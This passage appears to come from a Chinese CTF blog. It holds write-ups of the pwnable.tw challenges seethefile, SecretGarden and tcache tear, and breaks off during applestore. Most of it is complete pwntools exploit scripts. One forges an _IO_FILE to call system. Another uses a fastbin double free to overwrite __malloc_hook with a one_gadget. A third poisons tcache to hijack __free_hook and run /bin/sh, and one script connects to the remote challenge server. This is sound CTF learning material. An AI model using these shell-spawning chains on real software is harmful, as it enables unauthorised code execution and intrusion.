ELF('./libc_32.so.6')\nmylibc = ELF(\"/lib32/libc-2.23.so\")\nmyproc = process(myelf.path)\n#myproc = process(['./seethefile'], env={\"LD_PRELOAD\":\"./libc_32.so.6\"})\n#myproc = remote('chall.pwnable.tw',10200)\n\ndef openfile(filename):\n    myproc.sendlineafter(\"Your choice :\",'1')\n    myproc.sendlineafter(\"What do you want to see :\",filename)\n\ndef readfile():\n    myproc.sendlineafter(\"Your choice :\",'2')\n\ndef printfile():\n    myproc.sendlineafter(\"Your choice :\",'3')\n\ndef closefile():\n    myproc.sendlineafter(\"Your choice :\",'4')\n\ndef exit(name):\n    myproc.sendlineafter(\"Your choice :\",'5')\n    myproc.sendlineafter(\"Leave your name :\",name)\n\nclosefile()\ngdb.attach(myproc)\nexit('a'*50)\nmyproc.interactive()\n```\n\n执行以上出发代码，观察堆栈发现eax和esi都被输入的“a”字符给覆盖了。\n\n```shell\n$eax   : 0x61616161 (\"aaaa\"?)\n$ebx   : 0xf7f7a000  →  0x001afdb0\n$ecx   : 0xffffffff\n$edx   : 0xf7f7b870  →  0x00000000\n$esp   : 0xffe11f60  →  0xf7faa7eb  →   add esi, 0x15815\n$ebp   : 0xffe11f88  →  0xffe11fd8  →  0x00000000\n$esi   : 0x61616161 (\"aaaa\"?)\n$edi   : 0xf7f7a000  →  0x001afdb0\n$eip   : 0xf7e26ed7  →  <fclose+23> cmp BYTE PTR [esi+0x46], 0x0\n$eflags: [carry PARITY adjust zero SIGN trap INTERRUPT direction overflow RESUME virtualx86\n```\n\n# 2 利用\n\n根据fclose的特性，参考了以下几篇文章：\n\n[pwnable.tw 9 seethefile ](https://blog.csdn.net/qq_42192672/article/details/84782627)\n\n[glibc fclose源代码阅读及伪造_IO_FILE利用fclose实现任意地址执行](https://www.jianshu.com/p/2e00afb01606)\n\n（1）_IO_FILE结构体大小为0x94\n\n（2）flags & 0x2000为0就会直接调用_IO_FINSH(fp)，_IO_FINISH(fp)相当于调用fp->vtabl->__finish(fp)\n\n（3）将fp指向一块内存P，P偏移0的前4字节设置为0xffffdfff，P偏移4位置放上要执行的字符串指令（字符串以';'开头即可），P偏移sizeof(_IO_FILE)大小位置（vtable）覆盖为内存区域Q，Q偏移2*4字节处(vtable->__finish)覆盖为system函数地址即可\n\n（4）vtable是个虚标指针，里面一般性是21or23个变量\n\nexp如下：\n\n```python\n#coding=utf-8\n\nfrom pwn import *\ncontext(arch='i386',os='linux',log_level='debug')\nmyelf = ELF('./seethefile')\nmylibc = ELF('./libc_32.so.6')\n#mylibc = ELF(\"/lib32/libc-2.23.so\")\n#myproc = process(myelf.path)\n#myproc = process(['./seethefile'], env={\"LD_PRELOAD\":\"./libc_32.so.6\"})\nmyproc = remote('chall.pwnable.tw',10200)\n\ndef openfile(filename):\n    myproc.sendlineafter(\"Your choice :\",'1')\n    myproc.sendlineafter(\"What do you want to see :\",filename)\n\ndef readfile():\n    myproc.sendlineafter(\"Your choice :\",'2')\n\ndef printfile():\n    myproc.sendlineafter(\"Your choice :\",'3')\n\ndef closefile():\n    myproc.sendlineafter(\"Your choice :\",'4')\n\ndef exit(name):\n    myproc.sendlineafter(\"Your choice :\",'5')\n    myproc.sendlineafter(\"Leave your name :\",name)\n\n#泄露libc\nopenfile(\"/proc/self/maps\")\nreadfile()\nprintfile()\nlog.warn(myproc.recvline())\nlog.warn(myproc.recvline())\nlog.warn(myproc.recvline())\nlog.warn(myproc.recvline())\nlibc_addr = int(myproc.recv(8),16) + 0x1000\nlog.warn(\"libc_addr : 0x%x\" % libc_addr)\nsys_addr = libc_addr + mylibc.symbols['system']\nlog.warn(\"sys_addr: 0x%x\" % sys_addr)\nclosefile()\n#覆盖函数指针\nopenfile('/proc/self/maps')\nFAKE_IO_FILE_addr = 0x0804b300\npayload = \"a\"*32 + p32(FAKE_IO_FILE_addr)\npayload += \"\\x00\"*(0x80-4)\npayload += \"\\xff\\xff\\xdf\\xff;sh\\x00\".ljust(0x94,'\\x00')\npayload += p32(FAKE_IO_FILE_addr + 0x98)\npayload += p32(sys_addr)*21\nexit(payload)\n#gdb.attach(myproc)\nmyproc.interactive()\n```\n\n其他解题思路：\n\n[seethefile 解题思路](http://p4nda.top/2017/09/20/pwnable-tw-seethefile/)\n\n","categories":["CTF"]},{"title":"pwnable.tw之SecretGarden","url":"/2020/03/20/SecretGarden/","content":"\n[题目链接](https://pwnable.tw/challenge/#12)\n\n参考WP：\n\n[pwnable.tw中的secretgarden](https://www.lyyl.online/2019/09/27/pwnable-tw中的secretgarden/)\n\n[pwnable.tw 11~18题 writeup](https://veritas501.space/2018/03/04/pwnable.tw 11~18题 writeup/)\n\n[pwnable.tw-secretgarden](https://blog.ivan0.com/2018/11/18/pwnable-tw-secretgarden/)\n\n# 1 分析\n\n## 1.1 linux下查看二进制信息\n\n两条命令查看给定二进制文件基本信息：\n\n```shell\n$ file secretgarden \nsecretgarden: ELF 64-bit LSB shared object, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, for GNU/Linux 2.6.24, BuildID[sha1]=cc989aba681411cb235a53b6c5004923d557ab6a, stripped\n\n$ checksec secretgarden \n[*] Checking for new versions of pwntools\n    To disable this functionality, set the contents of /home/bling/.pwntools-cache-2.7/update to 'never'.\n[*] You have the latest version of Pwntools (4.0.1)\n[*] '/mnt/hgfs/vmshare-1604/secret_gargen/secretgarden'\n    Arch:     amd64-64-little\n    RELRO:    Full RELRO\n    Stack:    Canary found\n    NX:       NX enabled\n    PIE:      PIE enabled\n    FORTIFY:  Enabled\n```\n\n以上信息可以得知：\n\n- 64位二进制可执行程序，动态链接，去符号表\n- got表不可写\n- 栈不可执行，开启栈canary\n- 地址随机化开启\n\n## 1.2 IDA逆向源码逻辑\n\n第一眼就看到了alarm函数，patch掉。\n\n```c\nvoid __fastcall main(__int64 a1, char **a2, char **a3)\n{\n  __int64 choice_1; // [rsp+0h] [rbp-28h]\n  unsigned __int64 v4; // [rsp+8h] [rbp-20h]\n\n  v4 = __readfsqword(0x28u);\n  time_alarm();\n  while ( 1 )\n  {\n    print_info();\n    read(0, &choice_1, 4uLL);\n    switch ( (unsigned int)strtol((const char *)&choice_1, 0LL, 10) )\n    {\n      case 1u:\n        raise();                                // Raise a flower\n        break;\n      case 2u:\n        visit();                                // Visit the garden\n        break;\n      case 3u:\n        remove();                               // Remove a flower from the garden\n        break;\n      case 4u:\n        clean();                                // Clean the garden\n        break;\n      case 5u:\n        puts(\"See you next time.\");             // Leave the garden\n        exit(0);\n        return;\n      default:\n        puts(\"Invalid choice\");\n        break;\n    }\n  }\n}\n```\n\n源码一共实现了5个功能，分别是raise()，visit()，remove()， clean()，以及一个exit(0)退出函数。着重分析前三个函数功能。\n\n- raise()函数\n\n经过分析，raise()的功能主要是malloc一个堆块（flower_chunk），并将该堆块链接到bss段qword_202040（大小为100的数组），一共可以养100支花。如下图所示。\n\n![](secretgarden1.png)\n\n- visit()函数\n\n该函数会遍历bss段上全局变量qword_202040[100]中各个元素，并打印flower_chunk第一个元素为1的堆块内容（flower_chunk的第一个元素为1表明该flower处于raise状态，当remove后第一个元素会变为0）。\n\n- remove()函数\n\n该函数根据指定的数组下标，将对应的flower_chunk第一个元素置为0，并将第二个元素指向的堆块free掉。其中free代码如下：\n\n```c\nif ( v2 <= 99 && (v1 = (_DWORD *)qword_202040[v2]) != 0LL )\n  {\n    *v1 = 0;\n    free(*(void **)(qword_202040[v2] + 8LL));\n    result = puts(\"Successful\");\n  }\n```\n\n可以看到，本题的漏洞点就在这儿。free操作后，并没有将flower_chunk的第二个元素置NULL，导致一个悬空指针的产生。\n\n- clean()函数\n\n对delete过的节点，将其从bss段的qword_202040[100]中释放，并将qword_202040[100]相应元素置0。这个函数在我利用中没有用到。\n\n## 1.3 漏洞触发\n\n以double free的方式触发该漏洞，代码如下：\n\n```python\n#coding=utf-8\n\nfrom pwn import *\ncontext(arch='amd64',os='linux',log_level='debug')\nmyelf = ELF('./secretgarden')\nmylibc = ELF('libc_64.so.6')\n#myproc = process(myelf.path)\nmyproc = process(['./secretgarden'], env={\"LD_PRELOAD\":\"./libc_64.so.6\"})\n#myproc = remote('chall.pwnable.tw',10203)\n\ndef Raise(flength,fname,fcolor):\n    myproc.recvuntil('Your choice : ')\n    myproc.sendline('1')\n    myproc.recvuntil('Length of the name :')\n    myproc.sendline(flength)\n    myproc.recvuntil('The name of flower :')\n    myproc.sendline(fname)\n    myproc.recvuntil('The color of the flower :')\n    myproc.sendline(fcolor)\n\ndef Visit():\n    myproc.recvuntil('Your choice : ')\n    myproc.sendline('2')\n\ndef Remove(findex):\n    myproc.recvuntil('Your choice : ')\n    myproc.sendline('3')\n    myproc.recvuntil('Which flower do you want to remove from the garden:')\n    myproc.sendline(findex)\n\ndef Clean():\n    myproc.recvuntil('Your choice : ')\n    myproc.sendline('4')\n\ndef Leave():\n    myproc.recvuntil('Your choice : ')\n    myproc.sendline('5')\n\nRaise('40','f0','c0')\nRaise('40','f1','c1')\nRemove('0')\nRemove('0')\nmyproc.interactive()\n```\n\n执行后，出现如下错误提示信息：\n\n```shell\n[DEBUG] Received 0x5b bytes:\n    \"*** Error in `./secretgarden': double free or corruption (fasttop): 0x000055e3496bc050 ***\\n\"\n*** Error in `./secretgarden': double free or corruption (fasttop): 0x000055e3496bc050 ***\n```\n\n# 2 利用\n\n本题有一个double free的漏洞，并且有一个visit()函数可以打印flower_chunk的堆块内容。因此可以将libc中的某个地址泄露到flower_chunk堆块中，调用visit()函数进行打印，最后通过偏移计算libc基址。double free还可用于构造任意地址写，寻找合适的函数指针（如程序自带的函数指针，got表项，fini_array段函数指针或者libc中的函数指针）将其覆盖为system函数（并构造参数\"/bin/sh\\x00\"），或者直接调用one_gadget。\n\n- 泄露libc地址\n\n利用unsorted bin的特性。释放一个堆块到unsorted bin，然后又申请该大小的堆块，调用visit()打印flower_chunk中的name堆块其前0-8或8-16字节。\n\n在覆盖0-8字节时有两种办法：\n\n1）使用` sendline(\"a\"*7) `或`send(\"a\"*8) `\n\n2）使用`send(\"\")`\n\n```python\n#coding=utf-8\n\nfrom pwn import *\ncontext(arch='amd64',os='linux',log_level='debug')\nmyelf = ELF('./secretgarden')\nmylibc = ELF('libc_64.so.6')\n#myproc = process(myelf.path)\nmyproc = process(['./secretgarden'], env={\"LD_PRELOAD\":\"./libc_64.so.6\"})\n#myproc = remote('chall.pwnable.tw',10203)\n\ndef Raise(flength,fname,fcolor):\n    myproc.recvuntil('Your choice : ')\n    myproc.sendline('1')\n    myproc.recvuntil('Length of the name :')\n    myproc.sendline(flength)\n    myproc.recvuntil('The name of flower :')\n    myproc.sendline(fname)\n    myproc.recvuntil('The color of the flower :')\n    myproc.sendline(fcolor)\n\ndef Visit():\n    myproc.recvuntil('Your choice : ')\n    myproc.sendline('2')\n\ndef Remove(findex):\n    myproc.recvuntil('Your choice : ')\n    myproc.sendline('3')\n    myproc.recvuntil('Which flower do you want to remove from the garden:')\n    myproc.sendline(findex)\n\ndef Clean():\n    myproc.recvuntil('Your choice : ')\n    myproc.sendline('4')\n\ndef Leave():\n    myproc.recvuntil('Your choice : ')\n    myproc.sendline('5')\n\nRaise('38','f0','c0')\nRaise('200','f1','c1')\nRaise('38','f2','c2')\nRemove('0')\nRemove('1')\nRaise('200','a'*7,'c3')\n# 必须保证输入的name加上字符串结尾符正好是8个字节,这样才能泄露出后8个字节的地址\nVisit()\nmyproc.recvuntil('aaaaaaa\\n')\ntop_addr = u64(myproc.recv(6)+'\\x00\\x00')\nlibc_addr = top_addr - 0x3C3B78\n# 使用给定的libc_64.so.6,在调试时可以算出top_addr和libc_addr之间的差值为0x3C3B78\nlog.warn(\"top_addr:0x%x\" % top_addr)\nlog.warn(\"libc_addr:0x%x\" % libc_addr)\n\ngdb.attach(myproc)\nmyproc.interactive()\n```\n\n- 覆盖函数指针\n\n经过分析，本题采用覆盖`libc函数指针+one_gadget`的方式进行利用。直接覆盖malloc函数的方式不可行，因为one_gadget都有constraints约束条件，如下代码所示。\n\n```shell\n$ one_gadget libc_64.so.6 \n0x45216 execve(\"/bin/sh\", rsp+0x30, environ)\nconstraints:\n  rax == NULL\n\n0x4526a execve(\"/bin/sh\", rsp+0x30, environ)\nconstraints:\n  [rsp+0x30] == NULL\n\n0xef6c4 execve(\"/bin/sh\", rsp+0x50, environ)\nconstraints:\n  [rsp+0x50] == NULL\n\n0xf0567 execve(\"/bin/sh\", rsp+0x70, environ)\nconstraints:\n  [rsp+0x70] == NULL\n```\n\n堆里面有一种情况，就是free或者malloc出错时，会去调用`malloc_printerr`打印错误信息（如检测到double free时）。这个函数中会去调用malloc，此时的rsp+0x50可以满足上述约束条件。\n\n参考[gdb带源码调试libc](https://xuanxuanblingbling.github.io/ctf/pwn/2020/03/20/gdb/)方法获取执行到`__malloc_hook`时的约束条件。\n\n因此，选择将`__malloc_hook`函数指针覆盖为one_gadget地址。最后触发一次double free，进入`malloc_printerr`中调用`malloc`函数时会先执行`__malloc_hook`，于是one_gadget得到执行，成功get shell。\n\n# 3 EXP\n\n最终的exp如下：\n\n```python\n#coding=utf-8\n\nfrom pwn import *\ncontext(arch='amd64',os='linux',log_level='debug')\nmyelf = ELF('./secretgarden')\nmylibc = ELF('libc_64.so.6')\n#myproc = process(myelf.path)\nmyproc = process(['./secretgarden'], env={\"LD_PRELOAD\":\"./libc_64.so.6\"})\n#myproc = remote('chall.pwnable.tw',10203)\n\ndef Raise(flength,fname,fcolor):\n    myproc.recvuntil('Your choice : ')\n    myproc.sendline('1')\n    myproc.recvuntil('Length of the name :')\n    myproc.sendline(flength)\n    myproc.recvuntil('The name of flower :')\n    myproc.sendline(fname)\n    myproc.recvuntil('The color of the flower :')\n    myproc.sendline(fcolor)\n\ndef Visit():\n    myproc.recvuntil('Your choice : ')\n    myproc.sendline('2')\n\ndef Remove(findex):\n    myproc.recvuntil('Your choice : ')\n    myproc.sendline('3')\n    myproc.recvuntil('Which flower do you want to remove from the garden:')\n    myproc.sendline(findex)\n\ndef Clean():\n    myproc.recvuntil('Your choice : ')\n    myproc.sendline('4')\n\ndef Leave():\n    myproc.recvuntil('Your choice : ')\n    myproc.sendline('5')\n\nRaise('38','f0','c0')\nRaise('200','f1','c1')\nRaise('38','f2','c2')\nRemove('0')\nRemove('1')\nRaise('200','a'*7,'c3')\n# 必须保证输入的name加上字符串结尾符正好是8个字节,这样才能泄露出后8个字节的地址\nVisit()\nmyproc.recvuntil('aaaaaaa\\n')\ntop_addr = u64(myproc.recv(6)+'\\x00\\x00')\nlibc_addr = top_addr - 0x3C3B78\n# 使用给定的libc_64.so.6,在调试时可以算出top_addr和libc_addr之间的差值为0x3C3B78\n# log.warn(\"top_addr:0x%x\" % top_addr)\n# log.warn(\"libc_addr:0x%x\" % libc_addr)\n\nmalloc_hook = libc_addr + mylibc.symbols['__malloc_hook']\nfake_chunk = malloc_hook - 0x23\n# 根据__malloc_hook低地址的情况，__malloc_hook - 0x13处可以构造8字节0x000000000000007f作为fake_chunk的大小，此时fake_chunk的地址为__malloc_hook - 0x13 - 0x10\ngadget_addr = libc_addr + 0xf0567\n\nRaise('100','f0','c4')\nRaise('100','f1','c5')\nRemove('4')\nRemove('5')\nRemove('4')\nRaise('100',p64(fake_chunk),'c6')\nRaise('100','xx','c7')\nRaise('100','xx','c8')\nlog.warn('fake_chunk: 0x%x' % fake_chunk)\nlog.warn('malloc_hook: 0x%x' % malloc_hook)\nlog.warn('libc_addr: 0x%x' % libc_addr)\nlog.warn('gadget_addr: 0x%x' % gadget_addr)\n# hacked fastbin to fake_chunk\nRaise('100','a'*0x13 + p64(gadget_addr),'c9')\n# size 0x70 104\n# size 0x60 88\nRemove('8')\nRemove('8')\n#Visit()\n#gdb.attach(myproc)\nmyproc.interactive()\n```\n\n\n","categories":["CTF"]},{"title":"pwnable.tw之tcache tear","url":"/2020/03/13/tcachetear/","content":"\n[Tcache tear题目链接](https://pwnable.tw/challenge/#33)\n\n# 1 分析\n\n## 1.1 linux下查看二进制信息\n\n```shell\n$ file tcache_tear\ntcache_tear: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, for GNU/Linux 3.2.0, BuildID[sha1]=a273b72984b37439fd6e9a64e86d1c2131948f32, stripped\n\n$ checksec tcache_tear\n[*] '/mnt/hgfs/vmshare-1804/Tcache-tear/tcache_tear'\n    Arch:     amd64-64-little\n    RELRO:    Full RELRO\n    Stack:    Canary found\n    NX:       NX enabled\n    PIE:      No PIE (0x400000)\n    FORTIFY:  Enabled\n```\n\n可以得到如下信息：\n\n- 64位二进制程序，动态链接，去符号表\n- got表保护开启，got表不可写\n- 栈保护开启，栈不可执行，且有canary\n- 没有开启地址随机化\n\n## 1.2 IDA逆向源码逻辑\n\nmain中sub_400948()存在一个alarm定时函数，于是将它patch掉。（Edit --> Patch program -->Assemble，全部patch为nop）\n\n通过IDA分析Tcache tear的源码逻辑如下：\n\n![](tcachetear1.png)\n\n这里的漏洞点在num = 2的分支中，如下代码：\n\n```c\n if ( v4 <= 7 )\n      {\n        free(ptr);\n        ++v4;\n      }\n// free了全局变量ptr指向的堆内存，但并没有将该指针置NULL，导致悬空指针的产生。\n```\n\n本题采用的glibc 2.26 (ubuntu 17.10) 版本，为提升堆管理性能，舍弃了很多安全检查。如，对tcache而言，可以不间隔地free两个相同的堆，并添加到tcache链表中。\n\n本题中，控制Malloc的size在tcache范围内，执行如下命令可形成一个环：\n\n```c\nMalloc(size,data);\nfree();\nfree();\n```\n\n![](tcachetear2.png)\n\n下次malloc时，tcache将最右边的chunk返回给用户使用，用户可以更改其中的数据，如chunk的fd部分。那么当再一次malloc时，将右数第二个chunk（跟上一个实际是同一chunk）分配给用户。但此时由于fd被更改，下一次mallloc时，就会分配到fd中指定的地址。因此我们便可以在新地址中写一些数据，达到任意地址写的目的。\n\n接下来，我们触发一下这个漏洞试试，定个小目标，去修改全局变量0x602060处Global_name的值。\n\n\n\n## 1.3 漏洞触发 - 任意地址写\n\n初始化时，Global_name赋值为xiayuan，我的目标是把它改成wangyuxuan，代码如下：\n\n```python\nfrom pwn import *\ncontext(arch='amd64',os='linux',log_level='debug')\nmyelf = ELF('tcache_tear')\nmyproc = process(myelf.path)\n\ndef my_malloc(size,data):\n    myproc.recvuntil('Your choice :')\n    myproc.sendline('1')\n    myproc.recvuntil('Size:')\n    myproc.sendline(p64(size))\n    myproc.recvuntil('Data:')\n    myproc.sendline(data)\n\ndef my_free():\n    myproc.recvuntil('Your choice :')\n    myproc.send('2')\n\ndef my_info():\n    myproc.recvuntil('Your choice :')\n    myproc.send('3')\n\ndef my_exit():\n    myproc.recvuntil('Your choice :')\n    myproc.send('4')\n    \n# Global_name --> xiayuan\nmyproc.recvuntil('Name:')\nmyproc.sendline('xiayuan')\n\n# change Global_name --> wangyuxuan\nmy_malloc(200,'aaaaaaaaaa')\nmy_free()\nmy_free()\nmy_malloc(200,p64(0x602060))\nmy_malloc(200,'0')\nmy_malloc(200,'wangyuxuan')\n\ngdb.attach(myproc,'b * 0x00400c02 \\nc')\n\nmyproc.interactive()\n```\n\ngdb中查看Global_name处的值，成功被改\n\n```shell\ngef➤  x/s 0x602060\n0x602060:\t\"wangyuxuan\"\n```\n\n# 2 漏洞利用\n\n得到一个任意地址写的漏洞，我们通常有一下几种方式利用：\n\n- 修改函数指针\n- 修改got表\n- fini_array段函数指针\n- libc中的函数指针\n\n在本题中：\n\n- 程序没有自己的函数指针\n- got表不可写\n- 进入main函数后，一直处于while循环，不会执行到fini_array\n\n因此，我们只能去修改libc中的函数指针，需要：\n\n- 泄露libc基址\n- 利用libc中的函数指针\n\n## 2.1 泄露libc基址\n\n参考hacknote中，unsorted bin的特性。这里需要构造一个会被回收到unsorted bin中的chunk，然后将chunk中相应位置的数据（main_arena的top结构体）读出，减去它跟libc基址的偏移，就可以得到libc基址。\n\n一个又能被我们写，又能被我们读的位置，就是Global_name处。\n\nfree时除了检查当前块，还要检查nextchunk和nextchunk的nextchunk。因此总共需要构造三个块。\n\n大小分别为0x500（free时进入usorted bin）, 0x20, 0x20。且需要将他们的inuse位置1，以通过检查。\n\n- main_arena中top结构体距离libc基址的偏移：0x00007f762418fca0 - 0x00007f7623da4000 = 0x3ebca0\n\n![](tcachetear3.png)\n\n泄露libc地址的源码如下：\n\n```python\nfrom pwn import *\ncontext(arch='amd64',os='linux',log_level='debug')\nmyelf = ELF('tcache_tear')\nmyproc = process(myelf.path)\n\ndef my_malloc(size,data):\n    myproc.recvuntil('Your choice :')\n    myproc.sendline('1')\n    myproc.recvuntil('Size:')\n    myproc.sendline(str(size))\n    myproc.recvuntil('Data:')\n    myproc.sendline(data)\n\ndef my_free():\n    myproc.recvuntil('Your choice :')\n    myproc.sendline('2')\n\ndef my_info():\n    myproc.recvuntil('Your choice :')\n    myproc.sendline('3')\n\ndef my_exit():\n    myproc.recvuntil('Your choice :')\n    myproc.sendline('4')\n\nmyproc.recvuntil('Name:')\nmyproc.sendline(p64(0)+p64(0x501))\n\nmy_malloc(0x50,'a')\nmy_free()\nmy_free()\nmy_malloc(0x50,p64(0x602060 + 0x500))\nmy_malloc(0x50,'0')\nmy_malloc(0x50,(p64(0)+p64(0x21)+p64(0)+p64(0))*2)\n\nmy_malloc(0x70,'b')\nmy_free()\nmy_free()\nmy_malloc(0x70,p64(0x602060 + 0x10))\nmy_malloc(0x70,'0')\nmy_malloc(0x70,'b')\n\n# free, then get 'top' addr on 0x602060+0x10\nmy_free()\n\n# calc libc_addr\nmy_info()\nmyproc.recv('Name :')\nmyproc.recv(0x10)\nlibc_addr = u64(myproc.recv(0x8)) - 0x3ebca0\n\ngdb.attach(myproc,'b * 0x00400c02 \\nc')\n\nmyproc.interactive()\n```\n\n\n\n## 2.2 控制libc中的函数指针\n\nlibc中存在一些导出的hook函数指针：\n\n```shell\n$ strings libc-123.so | grep hook\n__malloc_initialize_hook\n_dl_open_hook\nargp_program_version_hook\n__after_morecore_hook\n__memalign_hook\n__malloc_hook\n__free_hook\n_dl_open_hook2\n__realloc_hook\n```\n\n[malloc hook初探](https://www.jianshu.com/p/0d7aa3166eec)\n\n根据这些hook函数的特性（malloc之前会调用`__malloc_hook`，free之前会调用`__free_hook`），我们可以劫持这些函数指针，来执行system函数或者one_gadget。\n\n```shell\n$ one_gadget libc-123.so \n0x4f2c5 execve(\"/bin/sh\", rsp+0x40, environ)\nconstraints:\n  rsp & 0xf == 0\n  rcx == NULL\n\n0x4f322 execve(\"/bin/sh\", rsp+0x40, environ)\nconstraints:\n  [rsp+0x40] == NULL\n\n0x10a38c execve(\"/bin/sh\", rsp+0x70, environ)\nconstraints:\n  [rsp+0x70] == NULL\n```\n\n# 3 EXP\n\n```python\n#coding=utf-8\nfrom pwn import *\ncontext(arch='amd64',os='linux',log_level='debug')\nmyelf = ELF('tcache_tear')\nmylibc = ELF('libc-123.so')\nmyproc = process(myelf.path)\n\ndef my_malloc(size,data):\n    myproc.recvuntil('Your choice :')\n    myproc.sendline('1')\n    myproc.recvuntil('Size:')\n    myproc.sendline(str(size))\n    myproc.recvuntil('Data:')\n    myproc.sendline(data)\n\ndef my_free():\n    myproc.recvuntil('Your choice :')\n    myproc.sendline('2')\n\ndef my_info():\n    myproc.recvuntil('Your choice :')\n    myproc.sendline('3')\n\ndef my_exit():\n    myproc.recvuntil('Your choice :')\n    myproc.sendline('4')\n\nmyproc.recvuntil('Name:')\nmyproc.sendline(p64(0)+p64(0x501))\n\nmy_malloc(0x50,'a')\nmy_free()\nmy_free()\nmy_malloc(0x50,p64(0x602060 + 0x500))\nmy_malloc(0x50,'0')\nmy_malloc(0x50,(p64(0)+p64(0x21)+p64(0)+p64(0))*2)\n\nmy_malloc(0x70,'b')\nmy_free()\nmy_free()\nmy_malloc(0x70,p64(0x602060 + 0x10))\nmy_malloc(0x70,'0')\nmy_malloc(0x70,'b')\n\n# free, then get 'top' addr on 0x602060+0x10\nmy_free()\n\n# calc libc_addr\nmy_info()\nmyproc.recvuntil('Name :')\nmyproc.recv(0x10)\nlibc_addr = u64(myproc.recv(0x8)) - 0x3ebca0\n\n# hijack __free_hook\nfree_hook = libc_addr + mylibc.symbols['__free_hook']\nsystem_addr = libc_addr + mylibc.symbols['system']\n# 1、将free_hook所在地址的值覆盖为system函数的地址值\nmy_malloc(0x90,'b')\nmy_free()\nmy_free()\nmy_malloc(0x90,p64(free_hook))\nmy_malloc(0x90,'0')\nmy_malloc(0x90,p64(system_addr))\n# 2、使void *ptr指向“/bin/sh”，后续free(ptr)时相当于执行system(\"/bin/sh\")\nmy_malloc(0x80,'/bin/sh\\x00')\n\nmy_free()\n# gdb.attach(myproc,'b * 0x00400c02 \\nc')\nmyproc.interactive()\n```\n\n\n\n\n\n\n\n\n\n\n\n","tags":["heap","tcache"],"categories":["CTF"]},{"title":"pwnable.tw之applestore","url":"/2020/03/07/applestore/","content":"\n[applestore题目链接](https://pwnable.tw/challenge/#7)\n\n这是一道我看着看着想哭的题目，真的太绕了。\n\n# 1 分析\n\n## 1.1 linux下查看二进制信息\n\n```shell\n$ file applestore\napplestore: ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), dynamically linked, interpreter /lib/ld-linux.so.2, for GNU/Linux 2.6.24, BuildID[sha1]=35f3890fc458c22154fbc1d65e9108a6c8738111, not stripped\n\n$ checksec applestore\n[*] '/mnt/hgfs/vmshare/applestore/applestore'\n    Arch:     i386-32-little\n    RELRO:    Partial RELRO\n    Stack:    Canary found\n    NX:       NX enabled\n    PIE:      No PIE (0x8048000)\n```\n\n可以得到如下信息：\n\n- 32位二进制程序，动态链接，没有去符号表\n- got表可写\n- 开启栈不可执行，并有canary\n- 没有开启地址随机化\n\n## 1.2 IDA逆向源码逻辑\n\nmain函数中，前两个函数时设置超时的，60秒程序就timeout了。\n\n- memset将全局变量mycart的16个字节全部初始化为0。\n- menu函数中做一些信息打印。从代码中可以看到，有6个选项。\n- handler函数中会进行一些处理。其中handler函数是重点，接下来我们对其中的每个函数详细分析。\n\n```c\nint __cdecl main(int argc, const char **argv, const char **envp)\n{\n  signal(14, timeout);\n  alarm(0x3Cu);\n  memset(&myCart, 0, 0x10u);\n  menu();\n  return handler();\n}\n\nint menu()\n{\n  puts(\"=== Menu ===\");\n  printf(\"%d: Apple Store\\n\", 1);\n  printf(\"%d: Add into your shopping cart\\n\", 2);\n  printf(\"%d: Remove from your shopping cart\\n\", 3);\n  printf(\"%d: List your shopping cart\\n\", 4);\n  printf(\"%d: Checkout\\n\", 5);\n  return printf(\"%d: Exit\\n\", 6);\n}\n\nunsigned int handler()\n{\n  char which_phone; // [esp+16h] [ebp-22h]\n  unsigned int v2; // [esp+2Ch] [ebp-Ch]\n\n  v2 = __readgsdword(0x14u);\n  while ( 1 )\n  {\n    printf(\"> \");\n    fflush(stdout);\n    my_read(&which_phone, 0x15u);\n    switch ( atoi(&which_phone) )\n    {\n      case 1:\n        list();                                 // apple store\n        break;\n      case 2:\n        add();                                  // Add into your shopping cart\n        break;\n      case 3:\n        delete();                               // Remove from your shopping cart\n        break;\n      case 4:\n        cart();                                 // List your shopping cart\n        break;\n      case 5:\n        checkout();                             // Checkout\n        break;\n      case 6:\n        puts(\"Thank You for Your Purchase!\");   // Exit\n        return __readgsdword(0x14u) ^ v2;\n      default:\n        puts(\"It's not a choice! Idiot.\");\n        break;\n    }\n  }\n}\n```\n\n### 1.2.1 list\n\n这个函数没什么好关注的，就是很多条打印信息，将苹果商店里有的商品及价格展示给我们。\n\n```c\nint list()\n{\n  puts(\"=== Device List ===\");\n  printf(\"%d: iPhone 6 - $%d\\n\", 1, 199);\n  printf(\"%d: iPhone 6 Plus - $%d\\n\", 2, 299);\n  printf(\"%d: iPad Air 2 - $%d\\n\", 3, 499);\n  printf(\"%d: iPad Mini 3 - $%d\\n\", 4, 399);\n  return printf(\"%d: iPod Touch - $%d\\n\", 5, 199);\n}\n```\n\n### 1.2.2 add\n\nadd函数的主要逻辑是将我们选择的商品添加进购物车。此函数看上去比较多，涉及5个case分支。实际只需关注create和insert两个函数功能。\n\n```c\nunsigned int add()\n{\n  _DWORD *v1; // [esp+1Ch] [ebp-2Ch]\n  char nptr; // [esp+26h] [ebp-22h]\n  unsigned int v3; // [esp+3Ch] [ebp-Ch]\n\n  v3 = __readgsdword(0x14u);\n  printf(\"Device Number> \");\n  fflush(stdout);\n  my_read(&nptr, 0x15u);\n  switch ( atoi(&nptr) )\n  {\n    case 1:\n      v1 = (_DWORD *)create(\"iPhone 6\", 199);\n      insert(v1);\n      goto LABEL_8;\n    case 2:\n      v1 = (_DWORD *)create(\"iPhone 6 Plus\", 299);\n      insert(v1);\n      goto LABEL_8;\n    case 3:\n      v1 = (_DWORD *)create(\"iPad Air 2\", 499);\n      insert(v1);\n      goto LABEL_8;\n    case 4:\n      v1 = (_DWORD *)create(\"iPad Mini 3\", 399);\n      insert(v1);\n      goto LABEL_8;\n    case 5:\n      v1 = (_DWORD *)create(\"iPod Touch\", 199);\n      insert(v1);\nLABEL_8:\n      printf(\"You've put *%s* in your shopping cart.\\n\", *v1);\n      puts(\"Brilliant! That's an amazing idea.\");\n      break;\n    default:\n      puts(\"Stop doing that. Idiot!\");\n      break;\n  }\n  return __readgsdword(0x14u) ^ v3;\n}\n```\n\n#### 1.2.2.1 create\n\ncreate函数中申请一个16字节大小的堆，并将该堆块分成4份。第0~3字节存放asprintf申请的堆空间地址（该新申请的堆中存放的是手机型号的字符串）。第4~7字节存放手机的价格。剩余8个字节目前存放的是0。随后将这个堆块的地址返回给上一层，上一层将该地址传递给insert。\n\n```c\nchar **__cdecl create(int p_type, char *p_money)\n{\n  char 